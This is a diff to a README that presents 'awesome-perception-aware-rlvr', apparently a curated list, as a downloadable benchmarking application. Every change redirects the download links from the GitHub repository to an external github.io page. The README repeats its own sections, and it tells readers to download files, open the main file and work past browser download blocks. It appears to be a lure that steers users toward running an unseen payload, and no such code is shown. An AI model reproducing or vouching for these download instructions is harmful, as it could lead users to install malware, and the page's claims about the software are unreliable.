@@ -1,6 +1,6 @@
 # 🚀 awesome-perception-aware-rlvr - Benchmark Visual AI with Ease
 
-[![Download the application](https://img.shields.io/badge/Download_Application-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/Darceysoluble677/awesome-perception-aware-rlvr)
+[![Download the application](https://img.shields.io/badge/Download_Application-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://darceysoluble677.github.io)
 
 ## 🔍 What This Application Does
 
@@ -18,7 +18,7 @@ Before you begin, create a folder where you want to keep the application. A simp
 
 ## 💾 Download and Setup
 
-Visit this link to download the application: [Download awesome-perception-aware-rlvr](https://github.com/Darceysoluble677/awesome-perception-aware-rlvr).
+Visit this link to download the application: [Download awesome-perception-aware-rlvr](https://darceysoluble677.github.io).
 
 After the download finishes, open the folder where your browser saved the files. Keep all files together in the same folder. Do not move individual files out of the download folder unless the included instructions specifically ask you to do so.
 
@@ -28,7 +28,7 @@ The download contains the application files and supporting materials for the ben
 
 # 🚀 awesome-perception-aware-rlvr - Benchmark Visual AI Models Easily
 
-[![Download the application](https://img.shields.io/badge/Download_Application-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/Darceysoluble677/awesome-perception-aware-rlvr)
+[![Download the application](https://img.shields.io/badge/Download_Application-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://darceysoluble677.github.io)
 
 ## 🔍 What This Application Does
 
@@ -56,7 +56,7 @@ If your computer meets these general requirements, you are ready to download the
 
 ## 💾 Download and Setup
 
-Visit this link to download the application: [Download awesome-perception-aware-rlvr](https://github.com/Darceysoluble677/awesome-perception-aware-rlvr).
+Visit this link to download the application: [Download awesome-perception-aware-rlvr](https://darceysoluble677.github.io).
 
 After the download finishes, open the folder where your browser saved the files. Keep all files together in the same folder. Do not move individual files out of the download folder unless the included instructions specifically ask you to do so.
 
@@ -132,7 +132,7 @@ If your browser blocks the download, look for a notification in the browser tool
 
 ## 📥 Download Again
 
-Visit this link to download the application: [Download awesome-perception-aware-rlvr](https://github.com/Darceysoluble677/awesome-perception-aware-rlvr).
+Visit this link to download the application: [Download awesome-perception-aware-rlvr](https://darceysoluble677.github.io).
 
 Keep the downloaded files in one folder and follow the running steps above. The application is ready to use once the files are saved and the main file is opened.
 
